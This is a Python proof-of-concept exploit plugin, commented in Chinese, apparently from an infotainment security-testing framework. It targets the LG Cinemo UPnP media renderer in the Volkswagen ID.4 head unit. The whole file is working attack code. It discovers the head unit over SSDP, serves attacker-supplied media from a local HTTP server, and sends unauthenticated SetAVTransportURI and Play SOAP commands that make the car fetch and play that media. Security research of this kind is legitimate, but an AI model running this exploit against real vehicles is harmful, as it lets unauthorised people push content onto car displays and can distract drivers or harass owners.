"""
PoC Name: Volkswagen ID.4 UPnP Media Injection (LGE Cinemo Optimized)
针对 LG Electronics Cinemo UPnP 实现的优化版本
"""
import socket
import requests
import xml.etree.ElementTree as ET
from urllib.parse import urljoin
from xml.sax.saxutils import escape as xml_escape
from html import unescape as html_unescape
import threading
import time
import os
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from iv_plugin_base import IVIVulnerabilityPlugin

class LGECinemoMediaInjectionPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-014-LGE"
    meta_poc_name = "LGE Cinemo Media Injection"
    meta_cve_id = "CWE-306"
    meta_severity = "High"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    LOCAL_PORT = 8000

    def __init__(self, target_config, logger=None, media_file=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "UPnP-VW-ID4-LGE-Cinemo-Injection"
        self.results["description"] = "大众 ID.4 (LGE Cinemo) UPnP 媒体注入"
        self.httpd = None
        self.media_file = media_file
        self.media_content = None
        self.media_type = "video/mp4"
        self.file_name = "media.mp4"
        self.device_info = {}
        self.callback_received = threading.Event()
        self.callback_requests = []
        self.avtransport_service_type = "urn:schemas-upnp-org:service:AVTransport:1"
        self.connection_manager_url = None
        self.connection_manager_service_type = None
        self.local_port = int(target_config.get("media_port", self.LOCAL_PORT))

    def check_prerequisites(self):
        if not self.target_ip:
            self.logger.error("需指定目标 IP")
        return None  # type: ignore

    def _load_media_file(self):
        """加载媒体文件"""
        if self.media_file and os.path.isfile(self.media_file):
            self.logger.info(f"[*] 加载媒体文件: {self.media_file}")
            with open(self.media_file, 'rb') as f:
                self.media_content = f.read()
            
            if self.media_file.lower().endswith(('.jpg', '.jpeg')):
                self.media_type = "image/jpeg"
                self.file_name = "image.jpg"
            elif self.media_file.lower().endswith('.png'):
                self.media_type = "image/png"
                self.file_name = "image.png"
            elif self.media_file.lower().endswith(('.mp4', '.m4v')):
                self.media_type = "video/mp4"
                self.file_name = "video.mp4"
            elif self.media_file.lower().endswith('.mov'):
                self.media_type = "video/quicktime"
                self.file_name = "video.mov"
            
            self.logger.info(f"[*] 媒体类型: {self.media_type}, 大小: {len(self.media_content)} 字节")
            return True
        else:
            self.logger.error(f"[-] 媒体文件不存在: {self.media_file}")
            return False

    def _start_http_server(self):
        """启动支持 DLNA 客户端 HEAD 和 Range 请求的媒体服务器。"""
        try:
            media_content = self.media_content or b''
            media_type = self.media_type
            logger = self.logger
            callback_received = self.callback_received
            callback_requests = self.callback_requests
            expected_path = f"/{self.file_name}"
            
            class MediaHandler(BaseHTTPRequestHandler):
                protocol_version = "HTTP/1.1"

                def _send_media_headers(self, status, offset=0, length=None):
                    if length is None:
                        length = len(media_content) - offset
                    self.send_response(status)
                    self.send_header('Content-Type', media_type)
                    self.send_header('Content-Length', str(length))
                    self.send_header('Accept-Ranges', 'bytes')
                    # Cinemo / DLNA renderers often require these headers before
                    # they will fetch a resource referenced by AVTransport.
                    self.send_header('transferMode.dlna.org', 'Streaming')
                    self.send_header('contentFeatures.dlna.org', 'DLNA.ORG_OP=01;DLNA.ORG_CI=0')
                    self.send_header('Connection', 'close')
                    if status == 206:
                        self.send_header(
                            'Content-Range',
                            f'bytes {offset}-{offset + length - 1}/{len(media_content)}',
                        )
                    self.end_headers()

                def _parse_range(self):
                    range_header = self.headers.get('Range', '')
                    if not range_header.startswith('bytes='):
                        return 0, len(media_content), 200
                    try:
                        start_text, end_text = range_header[6:].split('-', 1)
                        start = int(start_text) if start_text else 0
                        end = int(end_text) if end_text else len(media_content) - 1
                        if start < 0 or start >= len(media_content) or end < start:
                            raise ValueError('invalid range')
                        end = min(end, len(media_content) - 1)
                        return start, end - start + 1, 206
                    except (TypeError, ValueError):
                        return None, None, 416

                def _record_callback(self):
                    request = {
                        'method': self.command,
                        'path': self.path,
                        'range': self.headers.get('Range', ''),
                        'user_agent': self.headers.get('User-Agent', ''),
                    }
                    callback_requests.append(request)
                    callback_received.set()
                    logger.info(
                        "[HTTP] 车机回拉媒体: %s %s Range=%s",
                        request['method'], request['path'], request['range'] or 'none',
                    )

                def _serve_media(self, include_body):
                    if self.path.split('?', 1)[0] != expected_path:
                        self.send_error(404, 'media resource not found')
                        return
                    self._record_callback()
                    offset, length, status = self._parse_range()
                    if status == 416:
                        self.send_response(416)
                        self.send_header('Content-Range', f'bytes */{len(media_content)}')
                        self.end_headers()
                        return
                    self._send_media_headers(status, offset, length)
                    if include_body:
                        self.wfile.write(media_content[offset:offset + length])

                def do_GET(self):
                    self._serve_media(include_body=True)

                def do_HEAD(self):
                    self._serve_media(include_body=False)
                
                def log_message(self, format, *args):
                    pass
            
            self.httpd = ThreadingHTTPServer(("0.0.0.0", self.local_port), MediaHandler)
            self.logger.info(f"[HTTP] 媒体服务器启动 (端口 {self.local_port})")
            t = threading.Thread(target=self.httpd.serve_forever, daemon=True)
            t.start()
            return True
        except Exception as e:
            self.logger.error(f"启动媒体服务器失败: {e}")
            return False

    def _stop_http_server(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            self.httpd = None

    def _discover_location(self):
        """SSDP 发现，并为 LGE/Cinemo MediaRenderer 提供受控 URL 回退。"""
        msg = "\r\n".join([
            'M-SEARCH * HTTP/1.1',
            'HOST: 239.255.255.250:1900',
            'MAN: "ssdp:discover"',
            'MX: 2',
            'ST: urn:schemas-upnp-org:service:AVTransport:1',
            '', ''
        ]).encode('utf-8')

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(3)
        self.logger.info("[1/8] 发送 SSDP 发现请求...")
        
        try:
            sock.sendto(msg, ("239.255.255.250", 1900))
            start_time = time.time()
            while time.time() - start_time < 5:
                try:
                    data, addr = sock.recvfrom(65507)
                    if addr[0] == self.target_ip and b"LOCATION:" in data.upper():
                        for line in data.decode(errors='ignore').split("\r\n"):
                            if line.upper().startswith("LOCATION:"):
                                loc = line.split(":", 1)[1].strip()
                                self.logger.info(f"[+] 发现 LOCATION: {loc}")
                                
                                # 提取设备信息
                                for info_line in data.decode(errors='ignore').split("\r\n"):
                                    if info_line.upper().startswith("SERVER:"):
                                        self.device_info['server'] = info_line.split(":", 1)[1].strip()
                                        if "LGE" in self.device_info['server'] or "Cinemo" in self.device_info['server']:
                                            self.logger.info(f"[!] 检测到 LGE Cinemo 设备")
                                
                                sock.close()
                                return loc
                except socket.timeout:
                    break
        except Exception as e:
            self.logger.error(f"SSDP 异常: {e}")
        finally:
            sock.close()

        # 部分车机仅在特定状态下响应 SSDP M-SEARCH。对于本 PoC 已知的
        # LGE/Cinemo MediaRenderer，回退到设备描述符是只读探测，不会触发播放。
        fallback_location = self.params.get(
            "upnp_location",
            f"http://{self.target_ip}:49715/0/MediaRenderer/DeviceDesc.xml",
        )
        try:
            response = requests.get(fallback_location, timeout=5)
            if response.ok and b"MediaRenderer" in response.content:
                self.logger.info("[*] SSDP 未响应，使用设备描述符回退: %s", fallback_location)
                return fallback_location
        except requests.RequestException as exc:
            self.logger.debug("设备描述符回退失败: %s", exc)
        return None

    def _generate_didl_lite(self, media_url, protocol_info=None):
        """生成 LGE/Cinemo 可识别的 DIDL-Lite 元数据。"""
        if self.media_type.startswith('image/'):
            upnp_class = 'object.item.imageItem.photo'
        elif self.media_type.startswith('audio/'):
            upnp_class = 'object.item.audioItem.musicTrack'
        else:
            upnp_class = 'object.item.videoItem.movie'

        safe_url = xml_escape(media_url)
        protocol_info = protocol_info or f"http-get:*:{self.media_type}:*"
        safe_protocol_info = xml_escape(protocol_info, {'"': '&quot;'})
        return (
            '&lt;DIDL-Lite xmlns=&quot;urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/&quot; '
            'xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot; '
            'xmlns:upnp=&quot;urn:schemas-upnp-org:metadata-1-0/upnp/&quot;&gt;'
            '&lt;item id=&quot;0&quot; parentID=&quot;-1&quot; restricted=&quot;1&quot;&gt;'
            '&lt;dc:title&gt;ICV compatibility test media&lt;/dc:title&gt;'
            f'&lt;upnp:class&gt;{upnp_class}&lt;/upnp:class&gt;'
            f'&lt;res protocolInfo=&quot;{safe_protocol_info}&quot;&gt;{safe_url}&lt;/res&gt;'
            '&lt;/item&gt;&lt;/DIDL-Lite&gt;'
        )

    def _get_control_url(self, location_url):
        """提取 AVTransport 和 ConnectionManager 服务信息。"""
        try:
            self.logger.info(f"[*] 获取设备描述符...")
            resp = requests.get(location_url, timeout=5)
            xml_root = ET.fromstring(resp.content)
            ns = {"urn": "urn:schemas-upnp-org:device-1-0"}
            avtransport_url = None
            
            for service in xml_root.findall(".//urn:service", ns):
                stype = service.find("urn:serviceType", ns)
                curl = service.find("urn:controlURL", ns)
                
                if stype is not None and curl is not None:
                    service_type = stype.text or ""
                    full_url = urljoin(location_url, curl.text or "")
                    if "ConnectionManager" in service_type:
                        self.connection_manager_url = full_url
                        self.connection_manager_service_type = service_type
                        self.logger.info("[*] ConnectionManager ControlURL: %s", full_url)
                    elif "AVTransport" in service_type:
                        self.avtransport_service_type = service_type
                        avtransport_url = full_url

            if avtransport_url:
                self.logger.info(f"[2/8] AVTransport ControlURL: {avtransport_url}")
                return avtransport_url
        except Exception as e:
            self.logger.error(f"解析 ControlURL 失败: {e}")
        return None

    def _query_sink_protocol_info(self):
        """读取车机声明支持的媒体协议，避免猜测 DLNA profile。"""
        if not self.connection_manager_url or not self.connection_manager_service_type:
            self.logger.info("[*] 未公开 ConnectionManager；使用通用 video/mp4 protocolInfo。")
            return None

        soap = f'''<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
<s:Body><u:GetProtocolInfo xmlns:u="{self.connection_manager_service_type}" /></s:Body>
</s:Envelope>'''
        headers = {
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": f'"{self.connection_manager_service_type}#GetProtocolInfo"',
        }
        try:
            response = requests.post(
                self.connection_manager_url,
                data=soap.encode("utf-8"),
                headers=headers,
                timeout=10,
            )
            if response.status_code != 200:
                self.logger.warning("[*] GetProtocolInfo 返回 HTTP %s", response.status_code)
                return None

            root = ET.fromstring(response.content)
            sink = next((node.text or "" for node in root.iter() if node.tag.endswith("Sink")), "")
            candidates = [item.strip() for item in html_unescape(sink).split(',') if item.strip()]
            mime_candidates = [item for item in candidates if f":{self.media_type}:" in item]
            if mime_candidates:
                selected = mime_candidates[0]
                self.logger.info("[*] 车机声明支持的媒体协议: %s", selected)
                return selected

            if candidates:
                self.logger.warning(
                    "[*] 车机未声明支持 %s；已声明协议: %s",
                    self.media_type,
                    ", ".join(candidates[:4]),
                )
            return None
        except (requests.RequestException, ET.ParseError) as exc:
            self.logger.warning("[*] GetProtocolInfo 读取失败: %s", exc)
            return None

    def _send_soap_lge_optimized(self, ctrl_url, action, params):
        """
        发送 SOAP 请求（针对 LGE Cinemo）。

        SetAVTransportURI 是有状态控制动作：请求超时不代表车机没有接收，
        因此不能对同一媒体 URI 进行盲重试，避免重复触发车机侧处理。
        """
        param_str = "".join(f"<{k}>{v}</{k}>" for k, v in params.items())
        
        # 简化的 SOAP（不含 encodingStyle）
        soap = f"""<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
<s:Body>
<u:{action} xmlns:u="{self.avtransport_service_type}">
{param_str}
</u:{action}>
</s:Body>
</s:Envelope>"""
        
        headers = {
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": f'"{self.avtransport_service_type}#{action}"',
        }
        
        timeout_val = 20 if action == "SetAVTransportURI" else 10
        try:
            self.logger.debug(f"[SOAP-{timeout_val}s] 发送 {action} 请求 ({len(soap)} 字节)...")
            start = time.time()
            r = requests.post(ctrl_url, data=soap.encode('utf-8'), headers=headers, timeout=timeout_val)
            elapsed = time.time() - start
            self.logger.debug(f"[SOAP] {action} 完成 (耗时 {elapsed:.1f}s, 状态 {r.status_code})")
            return r.status_code, r.text
        except requests.exceptions.Timeout:
            return None, f"Timeout after {timeout_val}s; request was not retried"
        except Exception as e:
            self.logger.debug(f"[SOAP] {action} 异常: {e}")
            return None, str(e)

    def _verify_avtransport(self, ctrl_url):
        """用只读动作确认控制地址和 InstanceID 可用。"""
        status, response = self._send_soap_lge_optimized(
            ctrl_url,
            "GetTransportInfo",
            {"InstanceID": "0"},
        )
        if status == 200:
            self.logger.info("[4/8] AVTransport 只读预检成功。")
            return True
        self.logger.warning(
            "[4/8] AVTransport 只读预检未成功: %s；仍继续记录媒体兼容性结果。",
            status,
        )
        self.logger.debug("GetTransportInfo response: %s", response)
        return False

    def exploit(self):
        # 0. 加载媒体
        if not self._load_media_file():
            return
        
        # 1. 发现
        location = self._discover_location()
        if not location:
            self.logger.warning("[-] 未发现 AVTransport 服务")
            return

        # 2. 获取 ControlURL
        ctrl_url = self._get_control_url(location)
        if not ctrl_url:
            return

        # 3. 启动 HTTP 服务
        if not self._start_http_server():
            return
        time.sleep(0.5)
        
        # 获取本机 IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.target_ip, 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            # 如果不能连接到 80，尝试 49715
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((self.target_ip, 49715))
                local_ip = s.getsockname()[0]
                s.close()
            except:
                local_ip = "127.0.0.1"

        media_url = f"http://{local_ip}:{self.local_port}/{self.file_name}"
        self.logger.info(f"[3/8] 媒体 URL: {media_url}")

        # 4. 先确认控制服务可读，再执行一次有状态媒体设置动作。
        self._verify_avtransport(ctrl_url)
        # 使用 DIDL-Lite 提供容器、MIME 和资源地址。空元数据会被部分
        # Cinemo 版本直接解析为不存在的资源（UPnP error 716）。
        self.logger.info("[4/8] 开始 AVTransport 兼容性验证...")
        time.sleep(0.5)
        sink_protocol_info = self._query_sink_protocol_info()
        metadata = self._generate_didl_lite(media_url, sink_protocol_info)
        
        # SetAVTransportURI
        self.logger.info("[5/8] 发送 SetAVTransportURI...")
        status1, resp1 = self._send_soap_lge_optimized(
            ctrl_url, "SetAVTransportURI",
            {
                "InstanceID": "0",
                "CurrentURI": media_url,
                "CurrentURIMetaData": metadata,
            }
        )
        
        if status1 is None or status1 != 200:
            if status1 == 500 and '716' in (resp1 or ''):
                diagnosis = (
                    '车机拒绝媒体资源（UPnP 716）。请确认车机能够访问媒体 URL，'
                    '并使用 H.264/AAC 编码的 MP4 作为兼容性样本。'
                )
            elif status1 is None:
                diagnosis = (
                    'SetAVTransportURI 等待超时，且媒体服务器未收到车机回拉请求。'
                    '设备描述、AVTransport 和 video/mp4 协议已验证可用；'
                    '请检查车机到本机媒体端口的入站可达性或外部 URI 播放策略。'
                )
            else:
                diagnosis = f"SetAVTransportURI failed: {status1}"
            self.logger.error(f"[-] SetAVTransportURI 失败: {status1} - {resp1}")
            self.results["vulnerable"] = False
            self.results["evidence"] = diagnosis
            self._stop_http_server()
            return
        
        self.logger.info(f"✓ SetAVTransportURI 成功")
        time.sleep(1)
        
        # Play
        self.logger.info("[6/8] 发送 Play...")
        status2, resp2 = self._send_soap_lge_optimized(
            ctrl_url, "Play",
            {
                "InstanceID": "0",
                "Speed": "1"
            }
        )
        
        if status2 is None or status2 != 200:
            self.logger.error(f"[-] Play 失败: {status2}")
            self.results["vulnerable"] = False
            self.results["evidence"] = f"Play failed: {status2}"
            self._stop_http_server()
            return
        
        self.logger.info(f"✓ Play 成功")
        
        # 等待车机回拉，确认其能实际访问媒体服务器，而不只依赖 SOAP 200。
        self.logger.info("[7/8] 等待车机回拉媒体（最多 10 秒）...")
        callback_ok = self.callback_received.wait(timeout=10)
        
        # 结论
        self.logger.info("[8/8] 执行完成")
        if callback_ok:
            self.results["vulnerable"] = True
            self.results["evidence"] = (
                f"AVTransport accepted and renderer fetched media: {media_url}; "
                f"requests={self.callback_requests}"
            )
            self.logger.warning("[!] 【确认】车机已回拉媒体；请人工确认车机播放状态。")
        else:
            self.results["vulnerable"] = False
            self.results["evidence"] = (
                "AVTransport accepted, but the renderer did not fetch the media within 10 seconds. "
                "This indicates a reachability or codec compatibility problem, not a confirmed injection."
            )
            self.logger.warning("[!] 指令被接受，但未观察到车机回拉媒体。")

        self._stop_http_server()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("LGE Cinemo 媒体注入 PoC")
        print("用法: python3 14_LGE_Cinemo_MediaInjection.py <车机IP> --media <文件>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    media_file = None
    upnp_location = None
    media_port = None
    
    if "--media" in sys.argv:
        idx = sys.argv.index("--media")
        if idx + 1 < len(sys.argv):
            media_file = sys.argv[idx + 1]

    if "--location" in sys.argv:
        idx = sys.argv.index("--location")
        if idx + 1 < len(sys.argv):
            upnp_location = sys.argv[idx + 1]

    if "--media-port" in sys.argv:
        idx = sys.argv.index("--media-port")
        if idx + 1 < len(sys.argv):
            media_port = int(sys.argv[idx + 1])
    
    target_config = {"target_ip": target_ip}
    if upnp_location:
        target_config["upnp_location"] = upnp_location
    if media_port:
        target_config["media_port"] = media_port
    plugin = LGECinemoMediaInjectionPlugin(target_config, media_file=media_file)
    plugin.run_verify()
